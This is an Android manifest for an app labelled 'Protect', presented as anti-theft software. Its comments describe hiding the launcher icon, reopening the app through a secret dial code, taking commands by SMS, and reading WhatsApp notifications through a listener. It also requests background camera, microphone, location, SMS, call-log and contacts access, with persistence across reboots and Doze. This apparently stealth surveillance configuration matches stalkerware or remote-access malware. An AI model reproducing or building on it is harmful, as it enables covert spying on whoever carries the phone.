<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- ── Rede ── -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />

    <!-- ── Localização ── -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- ── Câmera e Áudio ── -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
    <uses-feature android:name="android.hardware.camera.flash" android:required="false" />
    <uses-feature android:name="android.hardware.microphone" android:required="false" />

    <!-- ── Acesso a Arquivos ── -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="29" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />

    <!-- ── Estado do Telefone/SIM ── -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />

    <!-- ── SMS (canal de controle sem internet) ── -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />

    <!-- ── Log de chamadas e contatos ── -->
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <!-- Gravação de ligações (detectar saída — deprecated API 29 mas ainda funciona) -->
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />

    <!-- ── Reconhecimento de Atividade ── -->
    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />

    <!-- ── Vibração ── -->
    <uses-permission android:name="android.permission.VIBRATE" />

    <!-- ── Persistência e Sistema ── -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <!-- API 33+ (Android 13): iniciar serviços exatos agendados -->
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"
        android:minSdkVersion="33" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM"
        android:minSdkVersion="33" />

    <!-- ── Serviços em primeiro plano ── -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />

    <application
        android:allowBackup="true"
        android:icon="@android:drawable/ic_menu_compass"
        android:label="Protect"
        android:roundIcon="@android:drawable/ic_menu_compass"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault.NoActionBar"
        android:requestLegacyExternalStorage="true"
        android:usesCleartextTraffic="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        tools:targetApi="31">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:label="Protect"
            android:screenOrientation="portrait"
            android:configChanges="orientation|screenSize|keyboardHidden|screenLayout|uiMode"
            android:windowSoftInputMode="adjustResize"
            android:theme="@android:style/Theme.DeviceDefault.NoActionBar">
            <!-- Sem intent-filter LAUNCHER aqui — o alias abaixo é a entrada do launcher.
                 Isso garante que a Activity nunca é desabilitada: só o alias é que some.
                 Funciona em Samsung OneUI, LG, AOSP e todos os outros launchers. -->
        </activity>

        <!-- ── Alias de Launcher (entrada visível na gaveta de apps) ─────────────
             Desabilitar ESTE componente oculta o ícone em todos os launchers,
             incluindo Samsung OneUI que ignora setComponentEnabledSetting na
             Activity principal. A MainActivity real permanece ativa e pode ser
             iniciada explicitamente pelo SecretCodeReceiver (*#*#7777#*#*).      -->
        <activity-alias
            android:name=".MainActivityAlias"
            android:targetActivity=".MainActivity"
            android:enabled="true"
            android:exported="true"
            android:label="Protect"
            android:icon="@android:drawable/ic_menu_compass">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- ── Serviço Principal Anti-Theft ─────────────────────────────────────
             foregroundServiceType deve incluir TODOS os tipos usados pelo serviço.
             API 34+: o tipo passado em startForeground() deve ser subconjunto deste. -->
        <service
            android:name=".AntiTheftService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location|camera|microphone|mediaProjection|specialUse" />

        <!-- ── Receptor de Boot (reinicia o serviço após boot) ──────────────── -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <!-- Boot padrão Android -->
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <!-- Direct Boot (API 24+, antes do unlock do usuário) -->
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <!-- Xiaomi / MIUI / HyperOS / Poco / Redmi -->
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <!-- HTC -->
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                <!-- Huawei / EMUI / HarmonyOS -->
                <action android:name="com.huawei.intent.action.HWBOOT_COMPLETED" />
                <!-- LG -->
                <action android:name="com.lge.lgps.QUICKBOOT_POWERON" />
                <!-- Meizu / Flyme -->
                <action android:name="com.meizu.intent.action.QUICK_BOOT" />
                <!-- Sony / Xperia -->
                <action android:name="com.sonyericsson.intent.action.BOOT_COMPLETED" />
                <action android:name="com.sony.msm.intent.action.BOOT_COMPLETED" />
                <!-- OnePlus (reboot via OxygenOS) -->
                <action android:name="android.intent.action.REBOOT" />
                <!-- Samsung / outros fabricantes: primeiro unlock pós-boot -->
                <action android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>

        <!-- ── Administrador do Dispositivo ──────────────────────────────────── -->
        <receiver
            android:name=".AdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- ── Serviço de Acessibilidade ─────────────────────────────────────── -->
        <service
            android:name=".ProtectAccessibilityService"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- ── Listener de Notificações WhatsApp ─────────────────────────────── -->
        <service
            android:name=".WhatsAppNotificationListener"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- ── Receptor de Comandos SMS ──────────────────────────────────────── -->
        <receiver
            android:name=".SmsCommandReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- ── Alarme Doze-proof (KeepAlive) ────────────────────────────────── -->
        <!-- setExactAndAllowWhileIdle dispara mesmo com o Android em Doze mode   -->
        <!-- Reinicia o serviço ou reconecta o WS a cada 5 minutos               -->
        <receiver
            android:name=".KeepAliveReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.androidprotect.KEEPALIVE" />
            </intent-filter>
        </receiver>

        <!-- ── Código Secreto *#*#7777#*#* ───────────────────────────────────── -->
        <receiver
            android:name=".SecretCodeReceiver"
            android:enabled="true"
            android:exported="true">
            <!-- Android 10 e anteriores -->
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE" />
                <data android:scheme="android_secret_code" android:host="7777" />
            </intent-filter>
            <!-- Android 11+ -->
            <intent-filter>
                <action android:name="android.telephony.action.SECRET_CODE" />
                <data android:scheme="android_secret_code" android:host="7777" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
